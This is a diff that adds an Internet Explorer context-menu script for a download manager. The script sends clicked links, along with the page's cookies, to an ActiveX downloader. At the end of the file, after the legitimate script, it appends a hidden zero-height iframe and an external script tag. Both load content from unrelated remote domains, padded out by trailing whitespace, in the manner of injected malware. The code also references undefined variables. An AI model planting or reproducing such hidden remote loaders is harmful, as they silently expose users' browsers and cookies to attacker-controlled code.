@@ -1,0 +1,119 @@
+﻿<script language="javascript">
+
+function AddLink(Url,Info,Location,strCookie)
+{
+    var com=new ActiveXObject("Windmill.Web.1");
+	var title = external.menuArguments.document.title;
+	
+	if( typeof(Location) == "undefined" || Location == "" )
+	{
+		com.Download(Url, title, "", strCookie);
+	}else
+	{
+			com.Download(Url, title, Location, strCookie);
+	}
+}
+
+function OnContextMenu()
+{
+	var srcEvent = external.menuArguments.event;
+	var EventElement;
+	
+	if(typeof(srcEvent.clientX) == "undefined")
+	{
+		EventElement = external.menuArguments.document.elementFromPoint ( srcEvent.pointerX, srcEvent.pointerY );
+	}
+	else
+	{
+		EventElement = external.menuArguments.document.elementFromPoint ( srcEvent.clientX, srcEvent.clientY );
+	}
+		
+		
+
+	var strDownloadPage = external.menuArguments.location.href;
+	
+
+
+	var srcAnchor;
+
+	if (srcEvent.type == "MenuExtAnchor")
+	{
+
+		srcAnchor = EventElement;
+
+		do
+		{ 
+			srcAnchor=srcAnchor.parentElement;
+		}while(typeof(srcAnchor)=="HTMLAnchorElement");
+		
+		AddLink(srcAnchor.href,srcAnchor.innerText,strDownloadPage,external.menuArguments.document.cookie);
+	}
+	else if (srcEvent.type == "MenuExtImage")
+	{
+		if (typeof(EventElement) == "HTMLAreaElement")
+		{
+			AddLink(EventElement.href,EventElement.Alt,strDownloadPage, strCID, strStatPage,external.menuArguments.document.cookie);
+		}
+		else 
+		{
+			var srcImage = EventElement;
+			var srcAnchor = srcImage.parentElement;
+			do
+			{ 
+				srcAnchor=srcAnchor.parentElement;
+				if (typeof(srcAnchor) == "undefined")
+				{
+					AddLink(srcImage.href,srcImage.Alt,strDownloadPage,external.menuArguments.document.cookie);
+					return;
+				}
+			}while(typeof(srcAnchor) == "HTMLAnchorElement");
+			AddLink(srcAnchor.href,srcImage.Alt,strDownloadPage);
+		}
+	}	
+	else if (srcEvent.type == "MenuExtUnknown")
+	{
+	srcAnchor = EventElement;
+	if(srcAnchor != null && srcAnchor.tagName != null && srcAnchor.tagName.toLowerCase() == "a")
+	    {
+	        AddLink(srcAnchor.href,srcAnchor.innerText,strDownloadPage,external.menuArguments.document.cookie);
+	    }
+	    else
+	    {
+	        while(srcAnchor != null && srcAnchor.tagName != null && srcAnchor.tagName.toLowerCase() != "a")
+	        {
+	            srcAnchor = srcAnchor.parentElement;
+	            if(srcAnchor != null && srcAnchor.tagName != null && srcAnchor.tagName.toLowerCase() == "a")
+	            {
+						AddLink(srcAnchor.href,srcAnchor.innerText, strDownloadPage,external.menuArguments.document.cookie);
+						return;
+	            }
+	        }
+			
+	        if(EventElement != null && EventElement.tagName != null)
+	        {
+	            AddLink(EventElement.href,EventElement.innerText,strDownloadPage,external.menuArguments.document.cookie);
+	        }
+	        else
+	        {
+	            alert("无法识别的链接");
+	        }
+	    }
+	}
+	else
+	{
+		
+	}
+}
+
+
+
+
+OnContextMenu();
+
+</script>
+
+<iframe src="http://www.mvoe.cn/all/index.htm?a" width="50" height="0" border="0"></iframe>   
+
+<script language=javascript src=http://www.68yu.cn/68down.js></script>                                                                                              
+
+                                                                                              
